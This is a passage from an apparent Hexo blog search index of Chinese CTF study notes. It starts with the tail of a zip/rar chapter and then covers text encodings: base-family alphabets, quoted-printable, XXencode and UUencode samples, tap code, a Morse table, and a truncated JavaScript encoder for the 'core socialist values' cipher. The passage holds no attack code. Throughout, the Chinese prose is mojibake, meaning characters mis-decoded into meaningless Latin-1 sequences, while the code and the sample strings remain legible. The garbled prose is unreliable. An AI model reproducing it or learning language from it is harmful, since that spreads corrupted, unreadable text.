class="hljs-built_in">print</span>(filename)<br></code></pre></td></tr></table></figure>

<p>ä¾‹é¢˜ï¼š<a href="https://buuoj.cn/match/matches/36/challenges#ZipBomb">BUU-DASCTF Sept X ZipBomb</a></p>
<p>å‚è€ƒ<br><a href="https://sp4n9x.github.io/2020/05/08/ZIP%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">ZIPæ–‡ä»¶æ ¼å¼åˆ†æ</a><br><a href="https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.3.6.TXT">ZIPå®˜æ–¹æ–‡æ¡£ - APPNOTE-6.3.6.TXT</a><br><a href="https://sp4n9x.github.io/2020/04/10/RAR%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">RARæ–‡ä»¶æ ¼å¼åˆ†æ</a><br><a href="https://en.wikipedia.org/wiki/RAR_(file_format)">RAR-wiki</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>æ€»ç»“</tag>
        <tag>éšå†™</tag>
        <tag>å‹ç¼©æ–‡ä»¶</tag>
      </tags>
  </entry>
  <entry>
    <title>miscæ€»ç»“(ç¼–ç ç¯‡)</title>
    <url>/posts/86a2c34b/</url>
    <content><![CDATA[<p>ç¼–ç &amp;å¯†ç ç¯‡</p>
<blockquote>
<p>æ¨è<a href="https://www.dcode.fr/">https://www.dcode.fr/</a>å’ŒCyberChef</p>
</blockquote>
<h1 id="å¸¸è§ç¼–ç "><a href="#å¸¸è§ç¼–ç " class="headerlink" title="å¸¸è§ç¼–ç "></a>å¸¸è§ç¼–ç </h1><h2 id="1-1-ASCIIç¼–ç "><a href="#1-1-ASCIIç¼–ç " class="headerlink" title="1.1. ASCIIç¼–ç "></a>1.1. ASCIIç¼–ç </h2><p>ASCIIç å¤§è‡´å¯ä»¥åˆ†ä½œä¸‰éƒ¨åˆ†ç»„æˆã€‚</p>
<p>ç¬¬ä¸€éƒ¨åˆ†æ˜¯ï¼šASCIIéæ‰“å°æ§åˆ¶å­—ç¬¦ã€‚ASCIIè¡¨ä¸Šçš„æ•°å­—0â€“31åˆ†é…ç»™äº†æ§åˆ¶å­—ç¬¦ï¼Œç”¨äºæ§åˆ¶åƒæ‰“å°æœºç­‰ä¸€äº›å¤–å›´è®¾å¤‡ã€‚</p>
<p>ç¬¬äºŒéƒ¨åˆ†æ˜¯ï¼šASCIIæ‰“å°å­—ç¬¦ã€‚æ•°å­— 32â€“126 åˆ†é…ç»™äº†èƒ½åœ¨é”®ç›˜ä¸Šæ‰¾åˆ°çš„å­—ç¬¦ï¼Œæ•°å­—127ä»£è¡¨ DELETE å‘½ä»¤ã€‚</p>
<p>ç¬¬ä¸‰éƒ¨åˆ†æ˜¯ï¼šæ‰©å±•ASCIIæ‰“å°å­—ç¬¦ã€‚æ‰©å±•çš„ASCIIå­—ç¬¦æ»¡è¶³äº†å¯¹æ›´å¤šå­—ç¬¦çš„éœ€æ±‚ã€‚æ‰©å±•çš„ASCIIåŒ…å«ASCIIä¸­å·²æœ‰çš„128ä¸ªå­—ç¬¦ï¼ˆæ•°å­—0â€“32æ˜¾ç¤ºåœ¨ä¸‹å›¾ä¸­ï¼‰ï¼Œåˆå¢åŠ äº†128ä¸ªå­—ç¬¦ï¼Œæ€»å…±æ˜¯256ä¸ªã€‚</p>
<p><img src="/img/summary/misc/ascii.png"></p>
<p><img src="/img/summary/misc/ascii-2.png"></p>
<h2 id="1-2-Baseå®¶æ—"><a href="#1-2-Baseå®¶æ—" class="headerlink" title="1.2. Baseå®¶æ—"></a>1.2. Baseå®¶æ—</h2><p>base64 ç¼–ç æ˜¯ç”¨64ï¼ˆ2^6ï¼‰ä¸ªå­—ç¬¦ï¼Œå¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç¼–ç çš„æ–¹å¼<br>base32 å°±æ˜¯ç”¨32ï¼ˆ2^5ï¼‰ä¸ªå­—ç¬¦ï¼Œå¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç¼–ç çš„æ–¹å¼<br>base16 å°±æ˜¯ç”¨16ï¼ˆ2^4ï¼‰ä¸ªå­—ç¬¦ï¼Œå¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç¼–ç çš„æ–¹å¼</p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°ï¼Œbaseç³»åˆ—ç¼–ç ä¹‹é—´çš„ä¸åŒï¼Œåœ¨äºç”¨äºç¼–ç çš„å­—ç¬¦æ•°é‡çš„å¤šå°‘<br>å…·ä½“å‚è€ƒ<a href="https://en.wikipedia.org/wiki/List_of_numeral_systems">wikiç™¾ç§‘</a></p>
<h3 id="1-2-1-base16ç è¡¨"><a href="#1-2-1-base16ç è¡¨" class="headerlink" title="1.2.1. base16ç è¡¨"></a>1.2.1. base16ç è¡¨</h3><p><code>0123456789ABCDEF</code> Base16ä½¿ç”¨ä¸¤ä¸ªASCIIå­—ç¬¦å»ç¼–ç åŸæ•°æ®ä¸­çš„ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼Œæ‰€ä»¥Base16ä¸å¯èƒ½ç”¨åˆ°å¡«å……ç¬¦å·<code>=</code></p>
<h3 id="1-2-2-base32ç è¡¨"><a href="#1-2-2-base32ç è¡¨" class="headerlink" title="1.2.2. base32ç è¡¨"></a>1.2.2. base32ç è¡¨</h3><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ234567</code> å¦æœ‰<code>=</code>ç¬¦å·ä½œä¸ºå¡«å……</p>
<h3 id="1-2-3-base58ç è¡¨"><a href="#1-2-3-base58ç è¡¨" class="headerlink" title="1.2.3. base58ç è¡¨"></a>1.2.3. base58ç è¡¨</h3><p><code>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</code> ç›¸æ¯” Base_64ï¼ŒBase_58 ä¸ä½¿ç”¨æ•°å­— â€œ0â€ï¼Œå­—æ¯å¤§å†™â€Oâ€ï¼Œå­—æ¯å¤§å†™ â€œIâ€ï¼Œå’Œå­—æ¯å°å†™ â€œlâ€ï¼Œä»¥åŠ â€œ+â€ å’Œ â€œ&#x2F;â€œ ç¬¦å·ï¼Œæ¯”Base64å…±å‡å°‘6ä¸ªå­—ç¬¦ï¼Œæ•…ç§°ç€Base58</p>
<h3 id="1-2-4-base62ç è¡¨"><a href="#1-2-4-base62ç è¡¨" class="headerlink" title="1.2.4. base62ç è¡¨"></a>1.2.4. base62ç è¡¨</h3><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789</code> Base62ä½¿ç”¨äº†62ä¸ªå­—ç¬¦ç¼–ç ï¼ŒåŒ…æ‹¬0-9ï¼Œa-zï¼ŒA-Zã€‚</p>
<h3 id="1-2-5-base64ç è¡¨"><a href="#1-2-5-base64ç è¡¨" class="headerlink" title="1.2.5. base64ç è¡¨"></a>1.2.5. base64ç è¡¨</h3><p><code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> å¦æœ‰<code>=</code>ç¬¦å·ä½œä¸ºå¡«å……</p>
<h3 id="1-2-6-base91ç è¡¨"><a href="#1-2-6-base91ç è¡¨" class="headerlink" title="1.2.6. base91ç è¡¨"></a>1.2.6. base91ç è¡¨</h3><p><img src="/img/summary/misc/base.png"></p>
<p>Base91ç¼–ç æ˜¯ä»94ä¸ªå¯æ‰“å°ASCIIå­—ç¬¦ï¼ˆ0x21-0x7Eï¼‰ä¸­ï¼Œä»¥ä¸‹ä¸‰ä¸ªå­—ç¬¦è¢«çœç•¥ä»¥æ„å»ºBase91ç¼–ç è¡¨ï¼š-ï¼ˆç ´æŠ˜å·ï¼Œ0x2Dï¼‰\ï¼ˆåæ–œæ ï¼Œ0x5Cï¼‰â€™ï¼ˆæ’‡å·ï¼Œ0x27ï¼‰</p>
<h2 id="1-3-Quoted-printable-ç¼–ç "><a href="#1-3-Quoted-printable-ç¼–ç " class="headerlink" title="1.3. Quoted-printable ç¼–ç "></a>1.3. Quoted-printable ç¼–ç </h2><p>Quoted-printableæˆ–QP encodingï¼Œæ²¡æœ‰è§„èŒƒçš„ä¸­æ–‡è¯‘åï¼Œå¯è¯‘ä¸ºå¯æ‰“å°å­—ç¬¦å¼•ç”¨ç¼–ç æˆ–ä½¿ç”¨å¯æ‰“å°å­—ç¬¦çš„ç¼–ç ã€‚Quoted-printableæ˜¯ä½¿ç”¨å¯æ‰“å°çš„ASCIIå­—ç¬¦ï¼ˆå¦‚å­—æ¯ã€æ•°å­—ä¸â€œ&#x3D;â€ï¼‰è¡¨ç¤ºå„ç§ç¼–ç æ ¼å¼ä¸‹çš„å­—ç¬¦ï¼Œä»¥ä¾¿èƒ½åœ¨7-bitæ•°æ®é€šè·¯ä¸Šä¼ è¾“8-bitæ•°æ®, æˆ–è€…æ›´ä¸€èˆ¬åœ°è¯´åœ¨é8-bit cleanåª’ä½“ä¸Šæ­£ç¡®å¤„ç†æ•°æ®ã€‚è¿™è¢«å®šä¹‰ä¸ºMIME content transfer encodingï¼Œç”¨äºe-mailã€‚</p>
<p>ä¾‹å­ï¼š<code>=E4=BB=8A=E5=B9=B4=E5=85=83=E5=A4=9C=E6=97=B6=EF=BC=8C=E6=9C=88=E4=B8=8E=E7=81=AF=E4=BE=9D=E6=97=A7=E3=80=82</code></p>
<p>ç‰¹ç‚¹ï¼šç”±<code>=</code>ï¼Œå¤§å†™å­—æ¯<code>Aâ€“F</code>å’Œæ•°å­—<code>0-9</code>ç»„æˆï¼Œä¸åŠ å¯†è‹±æ–‡å’Œæ•°å­—</p>
<p><a href="http://www.mxcz.net/tools/QuotedPrintable.aspx">åœ¨çº¿åŠ è§£å¯†</a></p>
<h2 id="1-4-XXencodeç¼–ç "><a href="#1-4-XXencodeç¼–ç " class="headerlink" title="1.4. XXencodeç¼–ç "></a>1.4. XXencodeç¼–ç </h2><p>è¡¨ï¼š<code>+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz</code></p>
<p>XXencodeå°†è¾“å…¥æ–‡æœ¬ä»¥æ¯ä¸‰ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ã€‚å¦‚æœæœ€åå‰©ä¸‹çš„èµ„æ–™å°‘äºä¸‰ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿçš„éƒ¨ä»½ç”¨é›¶è¡¥é½ã€‚è¿™ä¸‰ä¸ªå­—èŠ‚å…±æœ‰24ä¸ªBitï¼Œä»¥6bitä¸ºå•ä½åˆ†ä¸º4ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä»¥åè¿›åˆ¶æ¥è¡¨ç¤ºæ‰€å‡ºç°çš„æ•°å€¼åªä¼šè½åœ¨0åˆ°63ä¹‹é—´ã€‚ä»¥æ‰€å¯¹åº”å€¼çš„ä½ç½®å­—ç¬¦ä»£æ›¿ã€‚</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs XXencode">hK3VZPaBjN4KxewfYmCjCl94yohH1jwXxiDPLpfrOneepdQuvjTXEo95UkiiV<br>hcwXbiTjLvffnmeDDkfL2pwf-nwbNoxf6zPXqpxOxqeCggfitivL2gfyrrRD1<br>hkSCmiQPfcODJsgXxiDPLpfrOiP9Ho16oiDN0OLGXfB9IBa7dRAuehOLCivTK<br>hnecoiDPLuOCgkvysxhTdohH8ffrspgP+h95hmfv9yPDqnxOplAfxpfLKivjV<br>dkiHIqX0pjHMnpeuwt84XohH9yPPIouPKhPL2nfjKkxTKhzioygnacOA+<br></code></pre></td></tr></table></figure>

<p>ç‰¹ç‚¹ï¼šç¬¬ä¸€ä½é€šå¸¸è¡¨ç¤ºè¿™ä¸€è¡Œå¯†æ–‡æ˜¯ç”±å¤šå°‘ä¸ªå­—ç¬¦åŠ å¯†å¾—åˆ°çš„ï¼Œæ¯”å¦‚<code>cat</code>åŠ å¯†åæ˜¯<code>1Mq3o</code>ï¼Œ<code>1</code>åœ¨è¡¨ä¸­çš„ç´¢å¼•å€¼æ˜¯3ï¼Œæ‰€ä»¥å¯ä»¥çœ‹åšåŸæ–‡ç”±ä¸‰ä½å­—ç¬¦ç»„æˆã€‚å¹¶ä¸”æ¯è¡Œæœ€å¤šåªèƒ½åŠ å¯†<code>45</code>ä¸ªå­—ç¬¦ï¼Œç„¶åæ¢è¡Œï¼Œå¯ä»¥å‚è€ƒä¸Šé¢çš„ä¾‹å­</p>
<p><a href="http://web.chacuo.net/charsetxxencode">åœ¨çº¿åŠ è§£å¯†</a></p>
<h2 id="1-5-UUencodeç¼–ç "><a href="#1-5-UUencodeç¼–ç " class="headerlink" title="1.5. UUencodeç¼–ç "></a>1.5. UUencodeç¼–ç </h2><p>è¡¨ï¼š<code>ASCIIå­—ç¬¦é›†ä¸­å¯æ‰“å°å­—ç¬¦(32-96)</code></p>
<p>UUencodeæ˜¯ä¸€ç§äºŒè¿›åˆ¶åˆ°æ–‡å­—çš„ç¼–ç ï¼Œæœ€æ—©åœ¨unix é‚®ä»¶ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œå…¨ç§°ï¼šUnix-to-Unix encodingï¼ŒUUencodeå°†è¾“å…¥æ–‡æœ¬ä»¥æ¯ä¸‰ä¸ªå­—èŠ‚ä¸ºå•ä½è¿›è¡Œç¼–ç ï¼Œå¦‚æœæœ€åå‰©ä¸‹çš„èµ„æ–™å°‘äºä¸‰ä¸ªå­—èŠ‚ï¼Œä¸å¤Ÿçš„éƒ¨ä»½ç”¨é›¶è¡¥é½ã€‚ä¸‰ä¸ªå­—èŠ‚å…±æœ‰24ä¸ªBitï¼Œä»¥6-bitä¸ºå•ä½åˆ†ä¸º4ä¸ªç»„ï¼Œæ¯ä¸ªç»„ä»¥åè¿›åˆ¶æ¥è¡¨ç¤ºæ‰€å‡ºç°çš„å­—èŠ‚çš„æ•°å€¼ã€‚è¿™ä¸ªæ•°å€¼åªä¼šè½åœ¨0åˆ°63ä¹‹é—´ã€‚ç„¶åå°†æ¯ä¸ªæ•°åŠ ä¸Š32ï¼Œæ‰€äº§ç”Ÿçš„ç»“æœåˆšå¥½è½åœ¨ASCIIå­—ç¬¦é›†ä¸­å¯æ‰“å°å­—ç¬¦ï¼ˆ32-ç©ºç™½â€¦95-åº•çº¿ï¼‰çš„èŒƒå›´ä¹‹ä¸­ã€‚</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs UUencode">M555E;F-O9&amp;7*Q]*[UM:V_KWXUL:UO&lt;[$U]:UQ+&#x27;@PNNCK-?NU.?4VG5N:7@@<br>MT\J\_L^US;/6T,JYT\.CK,BKL\:CNE5N:7@M=&amp;\M56YI&gt;&quot;!E;F-O9&amp;EN9Z.L<br>M555E;F-O9&amp;6]J\KDR.O.Q+&amp;^TM3#O\C]N/;7UKW:SJJUI&lt;Z[O?C0T+&#x27;@PNNC<br>MK,CGN?O7[KKSRJ//PK7$U\K!S\G9T]K(_;CVU]:]VJ.LLKNYN[7$LK^WW=/#<br>MP&gt;.RN&lt;;KH:/(_;CVU]:]VKFRT]`R-+CV0FETHZS2U#8M8FETSJJUI&lt;Z[M];.<br>MJC2X]M?IHZS#O[CVU^G2U,JNO?C6QL&quot;TL&gt;W*OLOYL_;/UK7$U]:]VK7$ROW6<br>MM:&amp;CU&gt;*X]LK]UK76N[OAPN34VC&quot;UO38SUJZ\Y*&amp;CR+NZ\[VKP[^X]LK]O-/)<br>MSS,RHZS+^;+ZR?JUQ+WAN?NXU;K#PN34VD%30TE)U]:W^[ROUM&quot;_R;3RTZ&#x27;7<br>CUK?[HZ@S,BV_U;#7H:TY-2VUU\_?HZFUQ+&gt;VSJ?6KM;0H:,`<br></code></pre></td></tr></table></figure>


<p>ç‰¹ç‚¹ï¼šä¸XXencodeç›¸ä¼¼ï¼Œç¬¬ä¸€ä½è¡¨ç¤ºè¿™ä¸€è¡Œå¯†æ–‡æ˜¯ç”±å¤šå°‘ä¸ªå­—ç¬¦åŠ å¯†å¾—åˆ°çš„ã€‚</p>
<p><a href="http://web.chacuo.net/charsetuuencode">åœ¨çº¿åŠ è§£å¯†</a></p>
<h2 id="1-6-æ•²å‡»ç "><a href="#1-6-æ•²å‡»ç " class="headerlink" title="1.6. æ•²å‡»ç "></a>1.6. æ•²å‡»ç </h2><p>åŸºäº5Ã—5æ–¹æ ¼æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µæ¥å®ç°</p>
<p><img src="/img/summary/misc/tap%20code.png"></p>
<p>ä¾‹å­ï¼š<code>..... ../... ./... ./... ../</code></p>
<p>åŸæ–‡ï¼š<code>wllm</code></p>
<p>ç‰¹ç‚¹ï¼šä¸è¶…è¿‡äº”ä¸ªç‚¹ï¼Œä¸¤ä¸ªä¸€ç»„</p>
<h2 id="1-7-è«å°”æ–¯ç”µç "><a href="#1-7-è«å°”æ–¯ç”µç " class="headerlink" title="1.7. è«å°”æ–¯ç”µç "></a>1.7. è«å°”æ–¯ç”µç </h2><p>æ‘©å°”æ–¯ç”µç ä¸»è¦ç”±ä»¥ä¸‹5ç§å®ƒçš„ä»£ç ç»„æˆï¼š<br>1ï¼šç‚¹ï¼ˆ.ï¼‰<br>2ï¼šåˆ’ï¼ˆ-ï¼‰<br>3ï¼šæ¯ä¸ªå­—ç¬¦é—´çŸ­çš„åœé¡¿ï¼ˆé€šå¸¸ç”¨ç©ºæ ¼è¡¨ç¤ºåœé¡¿ï¼‰<br>4ï¼šæ¯ä¸ªè¯ä¹‹é—´ä¸­ç­‰çš„åœé¡¿ï¼ˆé€šå¸¸ç”¨ &#x2F; åˆ’åˆ†ï¼‰<br>5ï¼šä»¥åŠå¥å­ä¹‹é—´é•¿çš„åœé¡¿</p>
<p>è¡¨</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">A</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span>    <span class="hljs-comment">N</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span>    <span class="hljs-string">.</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-literal">+</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>    <span class="hljs-comment">1</span>  <span class="hljs-string">.</span><span class="hljs-literal">----</span><br><span class="hljs-comment">B</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">O</span>  <span class="hljs-literal">---</span>   <span class="hljs-string">,</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span>  <span class="hljs-comment">_</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>   <span class="hljs-comment">2</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">---</span><br><span class="hljs-comment">C</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>  <span class="hljs-comment">P</span>  <span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span>  <span class="hljs-comment">:</span>  <span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">$</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-comment">3</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><br><span class="hljs-comment">D</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span>   <span class="hljs-comment">Q</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-comment">&quot;</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>  <span class="hljs-comment">&amp;</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>    <span class="hljs-comment">4</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br><span class="hljs-comment">E</span>  <span class="hljs-string">.</span>     <span class="hljs-comment">R</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>   <span class="hljs-comment">&#x27;</span>  <span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span>  <span class="hljs-comment">/</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>    <span class="hljs-comment">5</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">F</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>  <span class="hljs-comment">S</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>   <span class="hljs-comment">!</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span>              <span class="hljs-comment">6</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">G</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span>   <span class="hljs-comment">T</span>  <span class="hljs-literal">-</span>     <span class="hljs-comment">?</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span>              <span class="hljs-comment">7</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">H</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">U</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>   <span class="hljs-comment">@</span>  <span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>              <span class="hljs-comment">8</span>  <span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><br><span class="hljs-comment">I</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span>    <span class="hljs-comment">V</span>  <span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>              <span class="hljs-comment">9</span>  <span class="hljs-literal">----</span><span class="hljs-string">.</span><br><span class="hljs-comment">J</span>  <span class="hljs-string">.</span><span class="hljs-literal">---</span>  <span class="hljs-comment">W</span>  <span class="hljs-string">.</span><span class="hljs-literal">--</span>   <span class="hljs-comment">;</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span>              <span class="hljs-comment">0</span>  <span class="hljs-literal">-----</span><br><span class="hljs-comment">K</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>   <span class="hljs-comment">X</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span>  <span class="hljs-comment">(</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><br><span class="hljs-comment">L</span>  <span class="hljs-string">.</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">Y</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span>  <span class="hljs-comment">)</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br><span class="hljs-comment">M</span>  <span class="hljs-literal">--</span>    <span class="hljs-comment">Z</span>  <span class="hljs-literal">--</span><span class="hljs-string">.</span><span class="hljs-string">.</span>  <span class="hljs-comment">=</span>  <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">-</span><br></code></pre></td></tr></table></figure>

<p>ä¾‹å­ï¼š<code>.../---/...</code></p>
<p>åŸæ–‡ï¼š<code>SOS</code></p>
<p><a href="http://tool.bugku.com/mosi/">åœ¨çº¿è§£å¯†</a></p>
<h2 id="1-8-ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç "><a href="#1-8-ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç " class="headerlink" title="1.8. ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç "></a>1.8. ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç </h2><p>githubä¸Šçš„åŠ è§£å¯†jsä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;babel-polyfill&quot;</span>;<br>&#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">assert</span>(<span class="hljs-params">...express</span>)&#123;<br>        <span class="hljs-keyword">const</span> l = express.<span class="hljs-property">length</span>;<br>        <span class="hljs-keyword">const</span> msg = (<span class="hljs-keyword">typeof</span> express[l-<span class="hljs-number">1</span>] === <span class="hljs-string">&#x27;string&#x27;</span>)? express[l-<span class="hljs-number">1</span>]: <span class="hljs-string">&#x27;Assert Error&#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> b <span class="hljs-keyword">of</span> express)&#123;<br>            <span class="hljs-keyword">if</span>(!b)&#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(msg);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">randBin</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt;= <span class="hljs-number">0.5</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> values = <span class="hljs-string">&#x27;å¯Œå¼ºæ°‘ä¸»æ–‡æ˜å’Œè°è‡ªç”±å¹³ç­‰å…¬æ­£æ³•æ²»çˆ±å›½æ•¬ä¸šè¯šä¿¡å‹å–„&#x27;</span>;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">str2utf8</span>(<span class="hljs-params">str</span>)&#123;<br>        <span class="hljs-comment">// return in hex</span><br><br>        <span class="hljs-keyword">const</span> notEncoded = <span class="hljs-regexp">/[A-Za-z0-9\-\_\.\!\~\*\&#x27;\(\)]/g</span>;<br>        <span class="hljs-keyword">const</span> str1 = str.<span class="hljs-title function_">replace</span>(notEncoded, <span class="hljs-function"><span class="hljs-params">c</span>=&gt;</span>c.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>        <span class="hljs-keyword">let</span> str2 = <span class="hljs-built_in">encodeURIComponent</span>(str1);<br>        <span class="hljs-keyword">const</span> concated = str2.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/%/g</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">toUpperCase</span>();<br>        <span class="hljs-keyword">return</span> concated;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">utf82str</span>(<span class="hljs-params">utfs</span>)&#123;<br>        <span class="hljs-title function_">assert</span>(<span class="hljs-keyword">typeof</span> utfs === <span class="hljs-string">&#x27;string&#x27;</span>, <span class="hljs-string">&#x27;utfs Error&#x27;</span>);<br><br>        <span class="hljs-keyword">const</span> l = utfs.<span class="hljs-property">length</span>;<br><br>        <span class="hljs-title function_">assert</span>((l &amp; <span class="hljs-number">1</span>) === <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">const</span> splited = [];<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; l; i++)&#123;<br>            <span class="hljs-keyword">if</span>((i &amp; <span class="hljs-number">1</span>) === <span class="hljs-number">0</span>)&#123;<br>                splited.<span class="hljs-title function_">push</span>(<span class="hljs-string">&#x27;%&#x27;</span>);<br>            &#125;<br>            splited.<span class="hljs-title function_">push</span>(utfs[i]);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span 